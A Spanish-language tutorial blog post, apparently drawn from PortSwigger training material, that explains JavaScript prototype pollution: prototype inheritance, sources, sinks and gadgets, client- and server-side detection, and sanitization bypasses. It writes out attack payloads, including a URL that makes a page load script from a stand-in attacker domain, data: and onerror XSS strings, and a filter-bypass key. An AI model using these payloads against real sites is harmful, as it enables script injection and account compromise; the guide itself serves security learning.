---
title: Prototype Pollution Guide
description: Guía sobre Prototype Pollution
date: 2026-04-22 12:30:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Portswigger Labs
  - Web Cache Poisoning
tags:
  - Portswigger Labs
  - Web Cache Deception
  - Exploiting origin server normalization for web cache deception
image:
  path: /assets/img/Portswigger/Portswigger.png
---

## Certificaciones

- eWPT
- eWPTXv2
- OSWE
- BSCP
  
## Descripción

`Explicación técnica de vulnerabilidades la prototype pollution`. Detallamos cómo `identificar` y `explotar` esta `vulnerabilidades`. Además, exploramos `estrategias clave para prevenirlas`

---

## ¿Qué es un prototype pollution?

El `prototype pollution` es una `vulnerabilidad` de `JavaScript` que `permite a un atacante añadir propiedades arbitrarias a los prototipos de objetos globales`, las cuales `pueden ser heredadas posteriormente por objetos definidos por el usuario`. Aunque `a menudo no es explotable por sí sola como una vulnerabilidad independiente, permite a un atacante controlar propiedades de objetos que normalmente serían inaccesibles`

`Si la aplicación maneja posteriormente una propiedad controlada por el atacante de forma insegura, esto puede combinarse con otras vulnerabilidades`. `En JavaScript del lado del cliente`, esto suele `derivar` en un `DOM XSS`, mientras que un `prototype pollution del lado del servidor` puede incluso `resultar` en un `remote code execution`

## Prototipos y herencia en JavaScript

`JavaScript utiliza un modelo de herencia basado en prototipos, que es bastante diferente del modelo basado en clases que usan muchos otros lenguajes`. En esta sección, proporcionaremos una visión general básica de cómo funciona esto

### ¿Qué es un objeto en JavaScript?

Un `objeto` en `JavaScript` es `esencialmente una colección de pares clave:valor conocidos como propiedades`. Por ejemplo, `el siguiente objeto podría representar un usuario`:

```
const user = {
    username: "wiener",
    userId: 01234,
    isAdmin: false
}
```

Podemos `acceder` a las `propiedades` de un `objeto` usando `notación de punto` o `notación de corchetes` para `referirte` a sus `respectivas claves`:

```
user.username     // "wiener"
user['userId']    // 01234
```

`Además de datos, las propiedades también pueden contener funciones ejecutables`. A estas `funciones` se las llama `métodos`

```
const user = {
    username: "wiener",
    userId: 01234,
    exampleMethod: function(){
        // hacer algo
    }
}
```

El `ejemplo anterior` es un `object literal`, lo que significa que `fue creado usando la sintaxis de llaves para declarar explícitamente sus propiedades y valores iniciales`. Sin embargo, es importante entender que `casi todo en JavaScript es un objeto internamente`. A lo largo de estos materiales, `el término objeto se refiere a todas las entidades, no solo a los object literals`

### ¿Qué es un prototipo en JavaScript?

`Cada objeto en JavaScript está vinculado a otro objeto de algún tipo, conocido como su prototipo`. Por defecto, `JavaScript asigna automáticamente uno de sus prototipos nativos a los nuevos objetos` . Por ejemplo, a los `strings` se les `asigna` automáticamente `String.prototype`. Estos son algunos `ejemplos` de estos `prototipos globales`:

```
let myObject = {};
Object.getPrototypeOf(myObject);    // Object.prototype

let myString = "";
Object.getPrototypeOf(myString);    // String.prototype

let myArray = [];
Object.getPrototypeOf(myArray);     // Array.prototype

let myNumber = 1;
Object.getPrototypeOf(myNumber);    // Number.prototype
```

`Los objetos heredan automáticamente todas las propiedades de su prototipo asignado, a menos que ya tengan su propia propiedad con la misma clave`. `Esto permite a los desarrolladores crear nuevos objetos que puedan reutilizar propiedades y métodos de objetos existentes`

`Los prototipos nativos proporcionan propiedades y métodos útiles para trabajar con tipos de datos básicos`. Por ejemplo, el objeto `String.prototype` tiene el método `toLowerCase()`. Como resultado, `todos los strings tienen automáticamente un método listo para usar que permite convertirlos a minúsculas`. Esto `evita` que `los desarrolladores tengan que añadir manualmente este comportamiento a cada nuevo string que crean`

### ¿Cómo funciona la herencia de objetos en JavaScript?

`Cada vez que hacemos referencia a una propiedad de un objeto, el motor de JavaScript primero intenta acceder a esa propiedad directamente en el propio objeto`. `Si el objeto no tiene una propiedad coincidente, el motor de JavaScript la busca en el prototipo del objeto`

Dado los siguientes `objetos`, esto nos permite, por ejemplo, hacer `referencia` a `myObject.propertyA`:

![[Pasted image 20260420195552.png]]

Podemos `usar` la `consola del navegador` para `ver` este `comportamiento` en `acción`. Primero, `creamos un objeto completamente vacío`:

```
let myObject = {};
```

Después, `escribimos myObject seguido de un punto`. Vemos que la `consola` nos `sugiere` una `lista de propiedades` y `métodos disponibles`

![[Pasted image 20260420195738.png]]

Aunque `no hay propiedades ni métodos definidos directamente en el objeto`, este `ha heredado algunos de Object.prototype`

### Cadena de prototipos

Debemos tener en cuenta que `el prototipo de un objeto es simplemente otro objeto, el cual también tiene su propio prototipo, y así sucesivamente`. Como `prácticamente todo en JavaScript es un objeto internamente, esta cadena finalmente termina en el prototipo de nivel superior Object.prototype`, cuyo `prototipo` es simplemente `null`

![[Pasted image 20260420195842.png]]

Es importante destacar que `los objetos no solo heredan propiedades de su prototipo inmediato, sino de todos los objetos que están por encima en la cadena de prototipos`. En el ejemplo anterior, esto significa que `el objeto username tiene acceso a las propiedades y métodos tanto de String.prototype como de Object.prototype`

### Acceder al prototipo de un objeto usando \_\_proto\_\_

`Cada objeto tiene una propiedad especial que se puede usar para acceder a su prototipo`. `Aunque no tiene un nombre formalmente estandarizado, \_\_proto\_\_ es el estándar usado por la mayoría de los navegadores`. `Para quienes dominan los lenguajes orientados a objetos, les resultará sencillo entender como funciona esta propiedad`, ya que `actúa` como un `getter` y como un `setter`. Esto significa que `podemos usarla para leer el prototipo y sus propiedades, e incluso reasignarlas si es necesario`

Como con cualquier propiedad, `podemos acceder a \_\_proto\_\_ usando la notación de punto o de corchetes`:

```
username.__proto__
username['__proto__']
```

Incluso podemos `encadenar referencias a \_\_proto\_\_ para recorrer la cadena de prototipos`:

```
username.__proto__                        // String.prototype
username.__proto__.__proto__              // Object.prototype
username.__proto__.__proto__.__proto__    // null
```

### Modificar prototipos

Aunque generalmente se considera una `mala práctica`, `es posible modificar los prototipos nativos de JavaScript como cualquier otro objeto`. Esto significa que `los desarrolladores pueden personalizar o sobrescribir el comportamiento de métodos integrados, e incluso añadir nuevos métodos para realizar operaciones útiles`

Por ejemplo, `el JavaScript moderno proporciona el método trim() para strings, que permite eliminar fácilmente los espacios en blanco al inicio o al final`. `Antes de que existiera este método integrado, los desarrolladores a veces añadían su propia implementación personalizada de este comportamiento al objeto String.prototype`, haciendo algo como esto:

```
String.prototype.removeWhitespace = function(){
    // eliminar espacios en blanco al inicio y al final
}
```

`Gracias a la herencia prototípica, todos los strings tendrían entonces acceso a este método`:

```
let searchTerm = "  example ";
searchTerm.removeWhitespace();    // "example"
```

## ¿Cómo surge un prototype pollution?

Un `prototype pollution` suele `surgir` cuando `una función de JavaScript mergea de forma recursiva un objeto que contiene propiedades controlables por el usuario con un objeto existente, sin antes sanitizar las claves (nombres de las propiedades de un objeto)`

Esto puede `permitir` que `un atacante inyecte una propiedad (clave + valor) que tenga \_\_proto\_\_ como clave, junto con propiedades anidadas arbitrarias`

`Debido al significado especial de \_\_proto\_\_ en el contexto de JavaScript, la operación de merge puede asignar las propiedades anidadas al prototipo del objeto en lugar de al propio objeto objetivo`. Como `resultado`, `el atacante puede contaminar el prototipo con propiedades que contienen valores maliciosos, los cuales posteriormente pueden ser utilizados por la aplicación de forma peligrosa`

Es posible `contaminar` el `prototipo` de `cualquier objeto`, pero `esto ocurre más comúnmente con el objeto global integrado Object.prototype`

`La explotación exitosa de un prototype pollution requiere los siguientes componentes clave`:

- Una `fuente` de `prototype pollution` - `Cualquier entrada que permita envenenar el prototipo de un objeto mediante propiedades arbitrarias`

- Un `sink` - `Una función de JavaScript o un elemento del DOM que permita la ejecución de código arbitrario`

- Un `gadget explotable` - `Cualquier propiedad que se pasa a un sink sin el filtrado o la sanitización adecuada`

### Fuentes de prototype pollution

Una `fuente` de `prototype pollution` es `cualquier entrada controlable por el usuario que permite añadir propiedades arbitrarias a objetos prototipo`. Las `fuentes más comunes` son las siguientes:

- La `URL`, ya sea a través de una `cadena de consulta (https://ejemplo.com/?id=123&user=mike)` o de un `URL fragment (https://ejemplo.com/productos#ofertas)`

- `Entradas` basadas en `JSON`

- `Web messages`

#### Prototype pollution a través de la URL

La siguiente `URL` que `contiene una cadena de consulta construida por un atacante`:

```
https://vulnerable-website.com/?__proto__[evilProperty]=payload
```

Al `descomponer` la `cadena de consulta` en `pares clave:valor`, `un parser de URL puede interpretar \_\_proto\_\_ como una cadena arbitraria`. Pero `veamos qué ocurre si estas claves y valores se combinan posteriormente con un objeto existente como propiedades`

Podríamos pensar que `la propiedad \_\_proto\_\_ junto con su propiedad anidada evilProperty simplemente se añadirán al objeto objetivo de la siguiente forma`:

```
{
    existingProperty1: 'foo',
    existingProperty2: 'bar',
    __proto__: {
        evilProperty: 'payload'
    }
}
```

Sin embargo, `esto no es lo que ocurre`. En algún punto, `la operación recursiva de merge puede asignar el valor de evilProperty usando una instrucción equivalente a la siguiente`:

```
targetObject.__proto__.evilProperty = 'payload';
```

`Durante esta asignación, el motor de JavaScript trata \_\_proto\_\_ como un getter del prototipo`. `Como resultado, evilProperty se asigna al objeto prototipo devuelto en lugar de al propio objeto objetivo`. Asumiendo que `el objeto objetivo usa Object.prototype por defecto, todos los objetos en el entorno de JavaScript heredarán ahora evilProperty, a menos que ya tengan una propiedad propia con la misma clave`

En la práctica, `inyectar una propiedad llamada evilProperty probablemente no tenga ningún efecto`. Sin embargo, `un atacante puede usar la misma técnica para contaminar el prototipo con propiedades que sí sean utilizadas por la aplicación o por una librería importada`

#### Prototype pollution a través de un JSON

`Los objetos controlables por el usuario a menudo se obtienen a partir de un string de JSON usando el método JSON.parse()`. Curiosamente, `JSON.parse() también trata cualquier clave del objeto JSON como una cadena arbitraria, incluyendo cosas como \_\_proto\_\_`. Esto proporciona otro `posible vector` de `prototype pollution`

Supongamos que `un atacante inyecta el siguiente JSON malicioso`, por ejemplo, `a través de un web message`:

```
{
    "__proto__": {
        "evilProperty": "payload"
    }
}
```

`Si esto se convierte en un objeto de JavaScript usando JSON.parse(), el objeto resultante sí tendrá una propiedad con la clave \_\_proto\_\_`:

```
const objectLiteral = {__proto__: {evilProperty: 'payload'}};
const objectFromJson = JSON.parse('{"__proto__": {"evilProperty": "payload"}}');

objectLiteral.hasOwnProperty('__proto__');     // false
objectFromJson.hasOwnProperty('__proto__');    // true
```

`Si el objeto creado mediante JSON.parse() se combina posteriormente con un objeto existente sin una correcta sanitización de las claves`, esto también `provocará` un `prototype pollution durante la asignación, tal y como vimos en el ejemplo anterior basado en URL`

### Sinks de prototype pollution

Un `sink de prototype pollution` es básicamente `una función de JavaScript o un elemento del DOM al que se puede acceder mediante prototype pollution, y que permite ejecutar JavaScript arbitrario o incluso comandos del sistema`

`Ya hemos cubierto algunos sinks del lado del cliente en la guía de XSS` [https://justice-reaper.github.io/posts/XSS-Guide](https://justice-reaper.github.io/posts/XSS-Guide)

`Como un prototype pollution nos permite controlar propiedades que normalmente serían inaccesibles, esto puede darnos acceso a más sinks dentro de la aplicación objetivo`. Los `desarrolladores` que `no están familiarizados con el prototype pollution pueden asumir erróneamente que estas propiedades no son controlables por el usuario, lo que significa que puede haber poco o ningún filtrado o sanitización aplicada`

### Gadgets de prototype pollution

`Un gadget proporciona una forma de convertir la vulnerabilidad de prototype pollution en un exploit real`. `Es cualquier propiedad que cumple con lo siguiente`:

- `Es utilizada por la aplicación de forma insegura`, por ejemplo, `pasándola a un sink sin el filtrado o la sanitización adecuada`

- `Es controlable por el atacante mediante prototype pollution`. Es decir, `el objeto debe poder heredar una versión maliciosa de la propiedad añadida al prototipo por un atacante`

`Una propiedad no puede ser un gadget si está definida directamente en el propio objeto`. En ese caso, `la versión propia del objeto tiene prioridad sobre cualquier versión maliciosa que se añada al prototipo`

`Los sitios web más robustos también pueden establecer explícitamente el prototipo del objeto en null`, lo que `garantiza` que `no herede ninguna propiedad en absoluto`

#### Ejemplo de un gadget de prototype pollution

`Muchas librerías de JavaScript aceptan un objeto que los desarrolladores usan para configurar distintas opciones`. `El código de la librería comprueba si el desarrollador ha añadido ciertas propiedades a ese objeto y, en ese caso, ajusta la configuración`. `Si una propiedad concreta no está presente, normalmente se usa un valor por defecto`. Un `ejemplo simplificado` sería:

```
let transport_url = config.transport_url || defaults.transport_url;
```

Ahora imaginemos que `el código de la librería usa transport_url para añadir un script a la página`:

```
let script = document.createElement('script');
script.src = `${transport_url}/example.js`;
document.body.appendChild(script);
```

`Si los desarrolladores del sitio web no han definido la propiedad transport_url en su objeto config`, esto se `convierte` en un `posible gadget`. `Si un atacante logra contaminar el Object.prototype global con su propia propiedad transport_url, esta será heredada por el objeto config y, por tanto, se usará como src del script, apuntando a un dominio controlado por el atacante`

`Por ejemplo, si el prototipo puede contaminarse mediante un parámetro en la URL`, el `atacante` solo tendría que `hacer que la víctima visite una URL especialmente construida para que su navegador cargue un archivo JavaScript malicioso desde un dominio controlado por él`:

```
https://vulnerable-website.com/?__proto__[transport_url]=//evil-user.net
```

Además, `proporcionando` una `URL` del tipo `data:`, `un atacante podría incluso incrustar directamente un payload XSS en la cadena de consulta`:

```
https://vulnerable-website.com/?__proto__[transport_url]=data:,alert(1);//
```

`Debemos tener en cuenta que las dos barras // al final en este ejemplo se usa simplemente para comentar el sufijo /example.js que está codificado en el script`

## Vulnerabilidades de prototype pollution del lado del cliente

`En esta sección aprenderemos cómo encontrar vulnerabilidades de prototype pollution del lado del cliente en situaciones reales`. Es posible `identificar` y `explotar` estas `vulnerabilidades` tanto de `forma manual` como con el `Dom Invader`

### Encontrar fuentes de prototype pollution del lado del cliente manualmente

`Encontrar fuentes de prototype pollution manualmente es en gran parte cuestión de prueba y error`. En resumen, `necesitamos probar distintas formas de añadir una propiedad arbitraria a Object.prototype hasta encontrar una que funcione`. `Al testear vulnerabilidades del lado del cliente, esto implica los siguientes pasos a alto nivel`:

`Intentar inyectar una propiedad arbitraria a través de la cadena de consulta, el URL fragment y cualquier entrada basada en JSON`. Por ejemplo: 

```
vulnerable-website.com/?__proto__[foo]=bar
```

En la `consola del navegador`, `inspeccionamos` el `Object.prototype` para `ver si lo hemos contaminado correctamente con la propiedad arbitraria`: 

```
Object.prototype.foo
// "bar" indica que has contaminado el prototipo correctamente
// undefined indica que el ataque no ha tenido éxito
```

`Si la propiedad no se añadió al prototipo, debemos probar otras técnicas, como cambiar a notación de punto en lugar de notación de corchetes, o viceversa`:

```
vulnerable-website.com/?__proto__.foo=bar
```

`Debemos de repetir este proceso para cada posible fuente`. `En el caso de que ninguna de estas técnicas tenga éxito, es posible que aún podamos contaminar el prototipo a través de su constructor`. Veremos cómo hacer esto con más detalle más adelante

### Encontrar fuentes de prototype pollution del lado del cliente usando DOM Invader

Como podemos ver, `encontrar fuentes de prototype pollution manualmente puede ser un proceso bastante tedioso`. En su lugar, `es recomendable usar el DOM Invader, que viene preinstalado con el navegador integrado de Burpsuite`. `El DOM Invader es capaz de testear automáticamente fuentes de prototype pollution mientras navegamos, lo que puede ahorrarnos una considerable cantidad de tiempo y esfuerzo`. `Ante cualquier duda podemos consultar la documentación de DOM Invader` [https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution#detecting-sources-for-prototype-pollution](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution#detecting-sources-for-prototype-pollution)

### Encontrar gadgets de prototype pollution del lado del cliente manualmente

`Una vez que hayamos identificado una fuente que nos permite añadir propiedades arbitrarias al Object.prototype global`, el `siguiente paso` es `encontrar un gadget adecuado que podamos usar para construir un exploit`. En la práctica, `es recomendable usar el DOM Invader para hacer esto, pero es útil ver el proceso manual, ya que puede ayudarnos a entender mejor la vulnerabilidad`. Estos son los `pasos a seguir para encontrar gadgets de prototype pollution del lado del cliente de forma manual`:

1 - `Buscar en el código fuente e identificar cualquier propiedad que sea utilizada por la aplicación o por las librerías que importe`

2 - En `Burpsuite`, debemos `activar` la `intercepción de respuestas (Proxy > Options > Intercept server responses)` e `interceptar la respuesta que contiene el JavaScript que queremos testear`

3 - `Añadir una instrucción que debugee al inicio del script y luego reenviar el resto de peticiones y respuestas`

4 - En el `navegador` de `Burpsuite`, `vamos a la página donde se carga el script objetivo`. `La instrucción para debugear detiene la ejecución del script`

5 - `Mientras el script está pausado, cambiamos a la consola e introducimos el siguiente comando, reemplazando YOUR-PROPERTY por una de las propiedades que creemos que puede ser un posible gadget`:

```
Object.defineProperty(Object.prototype, 'YOUR-PROPERTY', {
    get() {
        console.trace();
        return 'polluted';
    }
})
```

6 - La `propiedad` se `añade` al `Object.prototype global`, y `el navegador registrará un stack trace en la consola cada vez que sea accedida`

7 - `Reanudamos la ejecución del script y monitorizamos la consola`. `Si aparece un stack trace, esto confirma que la propiedad ha sido utilizada en algún punto dentro de la aplicación`

8 - `Expandimos el stack trace y utilizamos el enlace proporcionado para saltar a la línea de código donde se está leyendo la propiedad`

9 - `Usando los controles del depurador del navegador, avanzazamos paso a paso por cada fase de ejecución para ver si la propiedad se pasa a un sink`, como `innerHTML` o `eval()`

10 - `Repetir este proceso para cualquier propiedad que consideremos un posible gadget`

### Encontrar gadgets de prototype pollution del lado del cliente usando DOM Invader

Como podemos ver en los pasos anteriores, `identificar manualmente gadgets de prototype pollution en entornos reales puede ser una tarea bastante laboriosa`. Dado que `los sitios web suelen depender de numerosas librerías de terceros, esto puede implicar revisar miles de líneas de código minificado u ofuscado, lo que complica aún más el proceso`

`DOM Invader puede escanear automáticamente en busca de gadgets y, en algunos casos, incluso generar una prueba de concepto de algún DOM XSS que encuentre`. Esto significa que `podemos encontrar exploits en sitios web reales en cuestión de segundos en lugar de horas`

En estos `laboratorios` vemos como `aplicar` esta `técnica`:

- DOM XSS via client-side prototype pollution - [https://justice-reaper.github.io/posts/Prototype-Pollution-Lab-2/](https://justice-reaper.github.io/posts/Prototype-Pollution-Lab-2/)

- DOM XSS via an alternative prototype pollution vector - [https://justice-reaper.github.io/posts/Prototype-Pollution-Lab-3/](https://justice-reaper.github.io/posts/Prototype-Pollution-Lab-3/)

### Prototype pollution mediante el constructor

`Hasta ahora, hemos visto exclusivamente cómo obtener una referencia a objetos prototipo mediante la propiedad especial de acceso \_\_proto\_\_`. Como esta es la `técnica clásica de prototype pollution`, `una defensa habitual consiste en eliminar cualquier propiedad cuya clave sea \_\_proto\_\_ de los objetos controlados por el usuario antes de mergearos`. Sin embargo, este `enfoque` es `erróneo`, ya que `existen formas alternativas de referenciar Object.prototype sin depender en absoluto de la cadena \_\_proto\_\_`

`A menos que hayan seteado su prototipo en null, todos los objetos en JavaScript tienen la propiedad constructor, la cual contiene una referencia a la función constructor que se utilizó para crearlo`. Por ejemplo, `podemos crear un nuevo objeto usando sintaxis literal o invocando el constructor Object() de la siguiente manera`:

```
let myObjectLiteral = {};
let myObject = new Object();
```

Después, `podemos hacer referencia al constructor Object() mediante la propiedad integrada constructor`:

```
myObjectLiteral.constructor // function Object(){...}
myObject.constructor // function Object(){...}
```

`Es importante recalcar que las funciones también son objetos internamente`. `Cada función constructora tiene una propiedad prototype que apunta al prototipo que será asignado a cualquier objeto creado por ese constructor`. Como resultado, `también podemos acceder al prototipo de cualquier objeto de la siguiente forma`:

```
myObject.constructor.prototype // Object.prototype
myString.constructor.prototype // String.prototype
myArray.constructor.prototype // Array.prototype
```

`Como myObject.constructor.prototype es equivalente a myObject.proto`, esto proporciona una `vía alternativa` para `llevar a cabo un prototype pollution`

### Bypassear la sanitización defectuosa de claves

`Una forma evidente en la que los sitios web intentan evitar el prototype pollution es sanitizando las claves de las propiedades antes de combinarlas en un objeto existente`. Sin embargo, `un error común es no sanitizar de forma recursiva el valor del parámetro de consulta`. Por ejemplo, considerando la siguiente `URL`:

```
vulnerable-website.com/?__pro__proto__to__.gadget=payload
```

`Si el proceso de sanitización simplemente elimina la cadena \_\_proto\_\_ sin repetir este proceso más de una vez, esto daría como resultado la siguiente URL`:

```
vulnerable-website.com/?__proto__.gadget=payload
```

Esta `URL` podría `ser` una `fuente potencial válida para llevar a cabo un prototype pollution`

En este `laboratorio` vemos como `aplicar` esta `técnica`:

- Client-side prototype pollution via flawed sanitization - [https://justice-reaper.github.io/posts/Prototype-Pollution-Lab-4/](https://justice-reaper.github.io/posts/Prototype-Pollution-Lab-4/)

### Prototype pollution en bibliotecas externas

`Como ya hemos comentado, los gadgets que se usan para contaminar el prototipo pueden encontrarse en bibliotecas de terceros que son importadas por la aplicación`. En este caso, `es recomendable utilizar el DOM Invader para identificar fuentes y gadgets`. `Esto no solo es mucho más rápido, sino que también garantiza que no pasemos por alto vulnerabilidades que, de otro modo, serían extremadamente difíciles de detectar`

En este `laboratorio` vemos como `aplicar` esta `técnica`:

- Client-side prototype pollution in third-party libraries - [https://justice-reaper.github.io/posts/Prototype-Pollution-Lab-5/](https://justice-reaper.github.io/posts/Prototype-Pollution-Lab-5/)

### Prototype pollution mediante APIs del navegador

`Existen numerosos gadgets que pueden ser usados para contaminar el prototipo, cuyo uso está ampliamente extendido en las APIs de JavaScript que suelen proporcionar los navegadores`. En esta sección, `mostraremos cómo explotarlos para conseguir un DOM XSS, pudiendo incluso eludir defensas defectuosas contra prototype pollution implementadas por los desarrolladores`

#### Prototype pollution mediante fetch()

`La API Fetch proporciona una forma sencilla para que los desarrolladores realicen solicitudes HTTP utilizando JavaScript`. `El método fetch() acepta dos argumentos`:

- La `URL` a la que deseas `enviar` la `solicitud`

- Un `options object` que `permite controlar distintos aspectos de la solicitud`, como el `método`, las `cabeceras`, los `parámetros del body`, `etc`.

A continuación se muestra un `ejemplo de cómo se podría enviar una solicitud POST utilizando fetch()`:

```
fetch('https://normal-website.com/my-account/change-email', {
    method: 'POST',
    body: 'user=carlos&email=carlos%40ginandjuice.shop'
});
```

`Hemos definido explícitamente las propiedades method y body`, pero `existen otras propiedades que hemos dejado sin definir`. En este caso, `si un atacante consigue encontrar una fuente adecuada, podría contaminar el Object.prototype con su propia propiedad headers`. Esta `propiedad` podría ser `heredada` por el `options object` que se `pasa` a `fetch()` y `utilizarse posteriormente para generar la solicitud`

`Esto puede dar lugar a diversos problemas`. Por ejemplo, `el siguiente código es potencialmente vulnerable a un DOM XSS mediante prototype pollution`:

```
fetch('/my-products.json', { method: 'GET' })
    .then((response) => response.json())
    .then((data) => {
        let username = data['x-username'];
        let message = document.querySelector('.message');

        if (username) {
            message.innerHTML = `My products. Logged in as <b>${username}</b>`;
        }

        let productList = document.querySelector('ul.products');

        for (let product of data) {
            let product = document.createElement('li');
            product.append(product.name);
            productList.append(product);
        }
    })
    .catch(console.error);
```

`Para explotar esto, un atacante podría contaminar el Object.prototype con una propiedad headers que contenga una cabecera maliciosa como x-username`, de la siguiente forma:

```
?__proto__[headers][x-username]=<img/src/onerror=alert(1)>
```

Supongamos que `en el servidor, esta cabecera se utiliza para establecer el valor de la propiedad x-username en el archivo JSON devuelto`. `En el código vulnerable del lado del cliente mostrado anteriormente, este valor se asigna a la variable username, que posteriormente se pasa al sink innerHTML`, dando lugar a un `DOM XSS`

`Podemos usar esta técnica para controlar cualquier propiedad no definida del options object que se le pasa a fetch()`. Esto podría permitir por ejemplo `añadir un body malicioso a la solicitud`

#### Prototype pollution mediante Object.defineProperty()

`Los desarrolladores con cierto conocimiento sobre prototype pollution pueden intentar bloquear posibles gadgets utilizando el método Object.defineProperty()`. `Esto permite establecer una propiedad directamente en el objeto afectado como no configurable y no escribible, de la siguiente forma`:

```
Object.defineProperty(vulnerableObject, 'gadgetProperty', {
    configurable: false,
    writable: false
});
```

`Esto puede parecer inicialmente un intento razonable de mitigación, ya que evita que el objeto vulnerable herede una versión maliciosa de la propiedad “gadget” a través de la cadena de prototipos`. Sin embargo, este `enfoque` es `inherentemente defectuoso`

`Al igual que el método fetch() que hemos visto antes, el Object.defineProperty() acepta un options object conocido como descriptor`. Esto se puede `ver` en el `ejemplo anterior`

Entre otras cosas, `los desarrolladores pueden usar este objeto descriptor para establecer un valor inicial para la propiedad que se está definiendo`. Sin embargo, `si la única razón por la que están definiendo esta propiedad es protegerse contra la contaminación de prototipos, puede que no se molesten en establecer un valor`

En este caso, u`n atacante podría eludir esta defensa contaminando el Object.prototype de la propiedad con un valor malicioso`. `Si esta propiedad es heredada por el objeto descriptor pasado a Object.defineProperty(), el valor controlado por el atacante podría terminar asignándose a la propiedad gadget después de todo`

En este `laboratorio` vemos como `aplicar` esta `técnica`:

- Client-side prototype pollution via browser APIs - [https://justice-reaper.github.io/posts/Prototype-Pollution-Lab-1/](https://justice-reaper.github.io/posts/Prototype-Pollution-Lab-1/)

## Vulnerabilidades de prototype pollution del lado del servidor

`JavaScript fue originalmente un lenguaje del lado del cliente diseñado para ejecutarse en navegadores`. Sin embargo, `debido a la aparición de entornos de ejecución del lado del servidor, como Node.js, JavaScript ahora se utiliza ampliamente para construir servidores, APIs y otras aplicaciones de back-end`. Lógicamente, esto `significa` que también es `posible` que `surjan vulnerabilidades de prototype pollution en contextos del lado del servidor`

`Aunque los conceptos fundamentales siguen siendo en gran medida los mismos, el proceso de identificar vulnerabilidades de server-side prototype pollution y desarrollarlas hasta convertirlas en exploits funcionales presenta algunos desafíos adicionales`

En esta sección, `aprenderemos varias técnicas para la detección en caja negra de prototype pollution del lado del servidor`. `Cubriremos cómo hacerlo de forma eficiente y no destructiva`

### ¿Por qué es más difícil detectar un prototype pollution del lado del servidor?

Por varias razones, `un prototype pollution del lado del servidor es generalmente más difícil de detectar que su variante del lado del cliente`:

- `Sin acceso al código fuente` - `A diferencia de las vulnerabilidades del lado del cliente, normalmente no tendremos acceso al código JavaScript vulnerable`. Esto significa que `no hay una manera sencilla de obtener una visión general de qué sinks están presentes ni de identificar posibles propiedades que sean un gadget`

- `Falta de herramientas de desarrollo` - `Como JavaScript se ejecuta en un sistema remoto, no tenemos la posibilidad de inspeccionar objetos en tiempo de ejecución como lo haríamos usando las DevTools del navegador para inspeccionar el DOM`. Esto significa que `puede ser difícil saber cuándo hemos conseguido llevar a cabo el prototype pollution satisfactoriamente, a menos que hayamos provocado un cambio notable en el comportamiento del sitio web`. Esta `limitación` obviamente `no aplica en pruebas de caja blanca`

- `El problema del DoS` - `Llevar a cabo el prototype pollution con éxito en un entorno del lado del servidor usando propiedades reales a menudo rompe la funcionalidad de la aplicación o tumba el servidor por completo`. `Como es fácil provocar accidentalmente una denegación de servicio (DoS), realizar pruebas en producción puede ser peligroso`. Incluso si logramos `identificar` una `vulnerabilidad`, `desarrollarla hasta convertirla en un exploit también es complicado cuando hemos roto el sitio web en el proceso`

- `Persistencia del prototype pollution` - `Cuando realizamos pruebas en un navegador, podemos revertir todos nuestros cambios y obtener un entorno limpio de nuevo simplemente recargando la página`. Sin embargo, `una vez que llevamos a cabo un prototype pollution del lado del servidor, este cambio persiste durante toda la vida del proceso Node y no hay ninguna forma de restablecerlo`

`En las siguientes secciones, cubriremos una serie de técnicas no destructivas que nos permitirán testear de forma segura el prototype pollution del lado del servidor a pesar de estas limitaciones`

### Detectar un prototype pollution del lado del servidor mediante el reflejo de una propiedad contaminada

Una `trampa fácil` en la que los `desarrolladores` pueden `caer` es `olvidar o pasar por alto el hecho de que un bucle for...in de JavaScript itera sobre todas las propiedades enumerables de un objeto, incluyendo las que ha heredado a través de la cadena de prototipos`. Es importante recalcar que `esto no incluye las propiedades por defecto establecidas por los constructores nativos de JavaScript, ya que estas son no enumerables por defecto`

Podemos `comprobarlo` por nosotros mismos de la siguiente manera:

```
const myObject = { a: 1, b: 2 };

// contaminar el prototipo con una propiedad arbitraria
Object.prototype.foo = 'bar';

// confirmar que myObject no tiene su propia propiedad foo
myObject.hasOwnProperty('foo'); // false

// listar los nombres de las propiedades de myObject
for (const propertyKey in myObject) {
    console.log(propertyKey);
}

// Output: a, b, foo
```

Esto también `aplica` a los `arrays`, `donde un bucle for...in primero itera sobre cada índice, que en realidad no es más que una clave de propiedad numérica internamente, antes de continuar con las propiedades heredadas`:

```
const myArray = ['a', 'b'];

Object.prototype.foo = 'bar';

for (const arrayKey in myArray) {
    console.log(arrayKey);
}

// Output: 0, 1, foo
```

En cualquiera de los dos casos, `si la aplicación luego incluye las propiedades devueltas en una respuesta, esto puede proporcionar una manera sencilla de detectar el prototype pollution del lado del servidor`

`Las peticiones POST o PUT que envían datos JSON a una aplicación o API son candidatas ideales para este tipo de comportamiento, ya que es común que los servidores respondan con una representación JSON del objeto nuevo o actualizado`. En este caso, podríamos intentar `contaminar el Object.prototype global con una propiedad arbitraria de la siguiente manera`:

```
POST /user/update HTTP/1.1
Host: vulnerable-website.com
...
{
    "user": "wiener",
    "firstName": "Peter",
    "lastName": "Wiener",
    "__proto__": {
        "foo": "bar"
    }
}
```

Si el `sitio web` es `vulnerable`, `la propiedad inyectada aparecería en el objeto actualizado dentro de la respuesta`:

```
HTTP/1.1 200 OK
...
{
    "username": "wiener",
    "firstName": "Peter",
    "lastName": "Wiener",
    "foo": "bar"
}
```

En casos excepcionales, el sitio web incluso puede usar estas propiedades para generar HTML dinámicamente, lo que provoca que la propiedad inyectada se renderice en nuestro navegador

Una vez que hayamos identificado que es posible que haya un prototype pollution en el servidor, podemos buscar gadgets potenciales para usar en un exploit. Cualquier funcionalidad que implique actualizar datos de usuario merece ser investigada, ya que a menudo implica fusionar los datos entrantes en un objeto existente que representa al usuario dentro de la aplicación. Si podemos añadir propiedades arbitrarias a tu propio usuario, esto puede derivar en diversas vulnerabilidades, incluyendo la escalada de privilegios

En este `laboratorio` vemos como `aplicar` esta `técnica`:

- Privilege escalation via server-side prototype pollution - [https://justice-reaper.github.io/posts/Prototype-Pollution-Lab-6/](https://justice-reaper.github.io/posts/Prototype-Pollution-Lab-6/)

### Detectar un prototype pollution del lado del servidor que no refleja la propiedad envenenada

En la mayoría de los casos, incluso cuando logramos envenenar con éxito el prototipo de un objeto del lado del servidor, no podremos ver la propiedad afectada reflejada en una respuesta. Dado que tampoco podemos inspeccionar el objeto en una consola, esto representa un desafío a la hora de determinar si la inyección funcionó

